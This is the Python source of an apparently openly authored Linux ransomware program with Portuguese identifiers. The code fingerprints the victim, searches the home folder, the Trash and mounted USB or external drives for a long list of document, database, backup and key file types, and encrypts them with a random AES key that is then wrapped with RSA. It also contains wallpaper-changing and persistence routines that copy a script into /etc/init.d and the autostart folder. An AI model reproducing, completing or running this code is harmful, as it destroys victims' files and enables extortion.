#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import getpass
import sys
import json
import subprocess
import hashlib
import time
import threading
import tempfile

from AES import *
from RSA import *
from SRSA import *


file_types = '''.doc .docx .xls .xlsx .ppt .pptx .pst .ost .msg .eml .vsd .vsdx .txt .csv .rtf .wks .wk1 .pdf .dwg .onetoc2 .snt .jpeg .jpg .docb .docm .dot .dotm .dotx .xlsm .xlsb .xlw .xlt .xlm .xlc .xltx .xltm .pptm .pot .pps .ppsm .ppsx .ppam .potx .potm .edb .hwp .602 .sxi .sti .sldx .sldm .sldm .vdi .vmdk .vmx .gpg .aes .ARC .PAQ .bz2 .tbk .bak .tar .tgz .gz .7z .rar .zip .backup .iso .vcd .bmp .png .gif .raw .cgm .tif .tiff .nef .psd .ai .svg .djvu .m4u .m3u .mid .wma .flv .3g2 .mkv .3gp .mp4 .mov .avi .asf .mpeg .vob .mpg .wmv .fla .swf .wav .mp3 .sh .class .jar .java .rb .asp .php .jsp .brd .sch .dch .dip .pl .vb .vbs .ps1 .bat .cmd .js .asm .h .pas .cpp .c .cs .suo .sln .ldf .mdf .ibd .myi .myd .frm .odb .dbf .db .mdb .accdb .sql .sqlitedb .sqlite3 .asc .lay6 .lay .mml .sxm .otg .odg .uop .std .sxd .otp .odp .wb2 .slk .dif .stc .sxc .ots .ods .3dm .max .3ds .uot .stw .sxw .ott .odt .pem .p12 .csr .crt .key .pfx .der'''

# infected victim class
class infected():
    def __init__(self):
        self.nome_pc = None
        self.id = None

    def get_name(self):
        self.comando = subprocess.Popen('whoami', shell=True
                                                , stdin=subprocess.PIPE
                                                , stdout=subprocess.PIPE
                                                , stderr=subprocess.PIPE)
        self.nome_pc = self.comando.stdout.read().replace('\n','')

    def get_id(self):
        self.comando = subprocess.Popen('ifconfig -a | grep ether', shell=True
                                                                  , stdin=subprocess.PIPE
                                                                  , stdout=subprocess.PIPE
                                                                  , stderr=subprocess.PIPE)
        self.saida = self.comando.stdout.read()
        self.s = self.saida.split()
        self.mac_addr = self.s[1]
        self.id = hashlib.sha256(self.mac_addr).hexdigest()


def get_user():
    caminho = os.path.expanduser('~') + '/Desktop/'
    caminho2 = os.path.expanduser('~') + '/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    usuario = infected()
    usuario.get_name()
    nome_pc = usuario.nome_pc
    print(nome_pc)
    usuario.get_id()
    id_pc = usuario.id
    print(id_pc)
    data = {'id': id_pc, 'nome': nome_pc , 'btc_addr': None}
    string_data = json.dumps(data)
    with open(caminho_correto + 'config.json','wb') as f:
        f.write(string_data.encode())

    # ler campos
    # open('config.json','rb')
    # dados = f.read()
    # obj = json.loads(dados)
    # print(obj['id'])

# Starting point of encrypting
def menu(senha_AES):
    tipos_arquivos = file_types.split(' ')
    home = os.environ['HOME']

    # # the media
    t = threading.Thread(target = listar_media, args=(senha_AES, tipos_arquivos))
    t.start()

    # the trash
    t2 = threading.Thread(target=list_trash, args = (senha_AES, tipos_arquivos))
    t2.start()

    # the Home
    listar(senha_AES, home, tipos_arquivos)

    while threading.active_count() > 2:
        pass

def list_trash(senha_AES, tipos_arq):
    encrypt_list = []
    caminho = os.path.join(os.path.expanduser('~'), '/.local/share/Trash/files/')
    if(os.path.isdir(caminho)):
        for caminho, diret, arq in os.walk(caminho):
            for elemento in arq:
                arq = os.path.join(caminho, elemento)
                extensao = os.path.splitext(arq)
                for ext in tipos_arq:
                    if extensao[1] == ext:
                        encrypt_list.append(arq)
                        break

        for element in encrypt_list: # encrypt happens here
            criptografa(chave_AES , element)


# look's for external media such as usb / hd's
def listar_media(senha_AES, tipos_arq):
    encrypt_list = []
    print('Procurando por pendrives/HDs')
    caminho = '/media/'+getpass.getuser()
    if(os.path.isdir(caminho)):
        for caminho, diret, arq in os.walk(caminho):
            for elemento in arq:
                arq = os.path.join(caminho, elemento)
                extensao = os.path.splitext(arq)
                for ext in tipos_arq:
                    if extensao[1] == ext:
                        encrypt_list.append(arq)
                        break


        #cripto routine
        for element in encrypt_list: # encrypt happens here
            criptografa(chave_AES , element)
            

# lists and encrypt files
def listar(chave_AES, diretorio, tipos_arq):
    # add to the list the files inside the start directory
    file_to_encrypt = []
    arqs = os.listdir(diretorio)
    for arquivo in arqs:
        if(os.path.isfile(os.path.join(diretorio, arquivo))):
            file_to_encrypt.append(os.path.join(diretorio,arquivo))

    # add the file inside each directory
    ignorar = diretorio + '/.avfs'
    home = os.environ['HOME']
    listagem_dos_diretorios = os.listdir(diretorio)
    for elemento in listagem_dos_diretorios:
        if(elemento == '.avfs'):
            listagem_dos_diretorios.remove('.avfs') # remove virtual directory

    encrypt_list = [] # list of files found
    for elemento in listagem_dos_diretorios: # start looking throught the home directory of the user
        for caminho, diret, arquivo in os.walk(os.path.join(diretorio, elemento)):
            for arq in arquivo:
                file_found = os.path.join(caminho, arq)
                extensao = os.path.splitext(file_found)
                for ext in tipos_arq:
                    if(extensao[1] == ext): # found file with the extension
                        encrypt_list.append(file_found)
                        break

    for e in file_to_encrypt: # append local files inside the complete list of files inside directories
        encrypt_list.append(e)


    for element in encrypt_list: # encrypt happens here
        criptografa(chave_AES , element)


# Generate random AES key for each infection
def gera_chave_AES():
    caminho = os.path.expanduser('~') + '/Desktop/'
    caminho2 = os.path.expanduser('~') + '/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

    tamanho = 128 # bytes
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    with open(caminho_correto + 'AES.gnncry','w') as f:
        f.write(senha)
    return senha


# change the backgroud of the computer
def change_background():
    os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')


def persistence():
    def generate_decryptor():
        pass

    def generate_script():
        script = '''
            # script will be here base64encoded
        '''
    def generate_sh(): # still working around how to make a sh file
        f = open('.persistence.sh','wb')
        script = '''
        #!/bin/bash
        cd /tmp/
        python script.py
        '''
        f.write(script)
        f.close()
        # it should have -> daemon wating for new files / change wallpaper /

    generate_sh()


    TEMPDIR = tempfile.gettempdir()
    os.system('chmod +x .persistence.sh')
    subprocess.Popen('mv .persistence.sh ' + TEMPDIR, shell=True
                                                    , stdin=subprocess.PIPE
                                                    , stdout=subprocess.PIPE
                                                    , stderr=subprocess.PIPE)

    subprocess.Popen('cp ' + os.path.join(TEMPDIR, file_name) + ' /etc/init.d/arq.sh', shell=True
                                                                                     , stdin=subprocess.PIPE
                                                                                     , stdout=subprocess.PIPE
                                                                                     , stderr=subprocess.PIPE)
    #
    subprocess.Popen('cp ' + os.path.join(TEMPDIR, file_name) + ' ' + os.path.join(os.path.expanduser('~'), '.config/autostart/'), shell=True
                                                                                                                                 , stdin=subprocess.PIPE
                                                                                                                                 , stdout=subprocess.PIPE
                                                                                                                                 , stderr=subprocess.PIPE)

# main function
def main():
    AES_key = gera_chave_AES()
    menu(AES_key) # -> Encrypt everything
    AES_to_RSA()
    RSA_to_SRSA()

if __name__ == "__main__":
    main()
    #change_background()
    #get_user()
    #persistence()
    pass